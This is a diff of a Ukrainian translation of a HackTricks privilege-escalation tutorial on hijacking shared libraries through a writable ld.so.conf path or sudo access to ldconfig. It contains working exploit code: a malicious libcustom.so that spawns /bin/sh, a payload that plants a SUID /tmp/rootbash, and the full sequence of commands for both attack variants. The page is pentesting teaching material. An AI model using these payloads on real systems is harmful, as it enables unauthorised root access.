@@ -1,10 +1,10 @@
-# Приклад privesc exploit через ld.so
+# Приклад exploit privesc для ld.so
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Підготовка середовища
 
-У наступному розділі наведено код файлів, які ми будемо використовувати для підготовки середовища.
+У наступному розділі наведено код файлів, які ми використаємо для підготовки середовища
 
 {{#tabs}}
 {{#tab name="sharedvuln.c"}}
@@ -59,9 +59,9 @@ $ ./sharedvuln
 Welcome to my amazing application!
 Hi
 ```
-### Корисні команди triage
+### Корисні команди первинного аналізу
 
-Під час атаки на реальну ціль перевіряйте **точну назву бібліотеки**, яка потрібна бінарному файлу, і те, що **loader наразі вирішує**:
+Під час атаки на реальну ціль перевірте **точну назву бібліотеки**, яка потрібна бінарному файлу, і те, що **зараз визначає** loader:
 ```bash
 readelf -d ./sharedvuln | grep NEEDED
 ldconfig -p | grep libcustom
@@ -71,25 +71,22 @@ LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
 ```
 Кілька корисних нюансів:
 
-- `sudo echo ... > /etc/ld.so.conf.d/x.conf` зазвичай **не працює**, оскільки
-перенаправлення виконується поточною shell. Натомість використовуйте
+- `sudo echo ... > /etc/ld.so.conf.d/x.conf` зазвичай **не працює**, оскільки перенаправлення виконується вашою поточною оболонкою. Натомість використовуйте
 `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
 - Бінарні файли **SUID/privileged** ігнорують `LD_LIBRARY_PATH`/`LD_PRELOAD` у
-**secure-execution mode**, але директорії з `/etc/ld.so.conf` все одно є частиною
-довіреної конфігурації loader, тому ця помилкова конфігурація все ще може
-впливати на privileged програми.
+**secure-execution mode**, але каталоги, вказані в `/etc/ld.so.conf`, усе ще є частиною довіреної конфігурації loader, тому ця неправильна конфігурація все ще може впливати на privileged programs.<sup>[[1]](#references)</sup>
 - У новіших версіях glibc dynamic loader також підтримує
-`--list-diagnostics`, що зручно для налагодження розв'язання cache та вибору
-піддиректорій `glibc-hwcaps`, коли hijack поводиться неочікувано.
+`--list-diagnostics`, що зручно для налагодження визначення cache і вибору підкаталогів
+`glibc-hwcaps`, коли hijack працює не так, як очікується.<sup>[[1]](#references)</sup>
 
 ## Exploit
 
-У цьому сценарії припустімо, що **хтось створив вразливий запис** у файлі в _/etc/ld.so.conf/_:
+У цьому сценарії припустімо, що **хтось створив вразливий запис** усередині файлу в _/etc/ld.so.conf/_:
 ```bash
 echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
 ```
 Вразлива папка — _/home/ubuntu/lib_ (де ми маємо доступ на запис).\
-**Завантажте та скомпілюйте** наведений нижче код у цьому шляху:
+**Завантажте та скомпілюйте** наведений нижче код у цій папці:
 ```c
 // gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c
 
@@ -105,13 +102,13 @@ puts("I'm the bad library");
 system("/bin/sh");
 }
 ```
-Якщо ви очікуєте, що згодом **root** (або інший привілейований обліковий запис) виконає вразливий бінарний файл, зазвичай краще залишити **артефакт, власником якого є root**, замість запуску інтерактивної оболонки. Наприклад:
+Якщо ви очікуєте, що **root** (або інший привілейований обліковий запис) пізніше виконає вразливий бінарний файл, зазвичай краще залишити **root-owned artifact**, а не запускати інтерактивний shell. Наприклад:
 ```c
 system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
 ```
-Після виконання з привілейованими правами можна використати `/tmp/rootbash -p`.
+Після виконання з привілеями можна використати `/tmp/rootbash -p`.
 
-Тепер, коли ми **створили шкідливу бібліотеку libcustom у неправильно налаштованому** шляху, потрібно дочекатися **reboot** або виконання root-користувачем **`ldconfig`** (_якщо ви можете виконати цей binary через **sudo** або він має **suid bit**, ви зможете виконати його самостійно_).
+Тепер, коли ми **створили шкідливу бібліотеку libcustom у неправильно налаштованому** path, потрібно дочекатися **перезавантаження** або виконання root-користувачем **`ldconfig`** (_якщо ви можете виконати цей binary через **sudo** або він має **suid bit**, ви зможете виконати його самостійно_).
 
 Після цього **повторно перевірте**, звідки executable `sharedvuln` завантажує бібліотеку `libcustom.so`:
 ```c
@@ -121,7 +118,7 @@ libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
 /lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
 ```
-Як бачите, його **завантажено з `/home/ubuntu/lib`**, і якщо будь-який користувач його виконає, буде запущено shell:
+Як бачите, він **завантажує його з `/home/ubuntu/lib`**, і якщо будь-який користувач його виконає, буде запущено shell:
 ```c
 $ ./sharedvuln
 Welcome to my amazing application!
@@ -130,26 +127,26 @@ $ whoami
 ubuntu
 ```
 > [!TIP]
-> Зверніть увагу, що в цьому прикладі ми не підвищували привілеї, але, змінивши виконувані команди та **дочекавшись, поки root або інший привілейований користувач виконає вразливий binary**, ми зможемо підвищити привілеї.
+> Зверніть увагу, що в цьому прикладі ми не підвищували привілеї, але, змінивши команди, що виконуються, і **дочекавшись, поки root або інший привілейований користувач виконає вразливий binary**, ми зможемо підвищити привілеї.
 
-### Інші misconfigurations - Та сама vuln
+### Інші misconfigurations - Same vuln
 
-У попередньому прикладі ми змоделювали misconfiguration, за якої адміністратор **вказав непривілейовану папку всередині configuration file у `/etc/ld.so.conf.d/`**.\
-Але існують й інші misconfigurations, які можуть спричинити ту саму vulnerability: якщо ви маєте **write permissions** до будь-якого **config file** у `/etc/ld.so.conf.d`, до папки `/etc/ld.so.conf.d` або до файлу `/etc/ld.so.conf`, ви можете налаштувати ту саму vulnerability та exploit її.
+У попередньому прикладі ми імітували misconfiguration, за якої адміністратор **вказав непривілейовану папку всередині configuration file у `/etc/ld.so.conf.d/`**.\
+Але існують й інші misconfigurations, які можуть спричинити ту саму vulnerability: якщо у вас є **write permissions** до якогось **config file** всередині `/etc/ld.so.conf.d`, до папки `/etc/ld.so.conf.d` або до файлу `/etc/ld.so.conf`, ви можете налаштувати ту саму vulnerability і exploit її.
 
 ## Exploit 2
 
 **Припустімо, що ви маєте sudo privileges для `ldconfig`**.\
-Ви можете вказати `ldconfig`, **звідки завантажувати conf files**, тож ми можемо скористатися цим, щоб змусити `ldconfig` завантажувати довільні папки.\
-Отже, створімо необхідні files і folders для завантаження "/tmp":
+Ви можете вказати `ldconfig`, **звідки завантажувати conf files**, тож скористаємося цим, щоб змусити `ldconfig` завантажити довільні папки.<sup>[[2]](#references)</sup>\
+Отже, створімо files і folders, необхідні для завантаження "/tmp":
 ```bash
 cd /tmp
 mkdir -p conf
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
-Тепер, як зазначено в **попередньому exploit**, **створіть malicious library у `/tmp`**.\
-І нарешті, завантажмо шлях і перевіримо, звідки binary завантажує library:
+Тепер, як зазначено в **попередньому exploit**, **створіть malicious library всередині `/tmp`**.\
+І нарешті, завантажимо шлях і перевіримо, звідки binary завантажує library:
 ```bash
 sudo ldconfig -f fake.ld.so.conf
 
@@ -159,12 +156,11 @@ libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
 ```
-**Як ви можете бачити, маючи привілеї sudo для `ldconfig`, ви можете використати цю саму вразливість.**
-
-
+**Як бачите, маючи sudo-привілеї над `ldconfig`, ви можете експлуатувати ту саму вразливість.**
 
 ## Посилання
 
-- [ld.so(8) - сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
-- [ldconfig(8) - сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
+- [1] [`ld.so(8)` - сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
+- [2] [`ldconfig(8)` - сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
+
 {{#include ../../banners/hacktricks-training.md}}
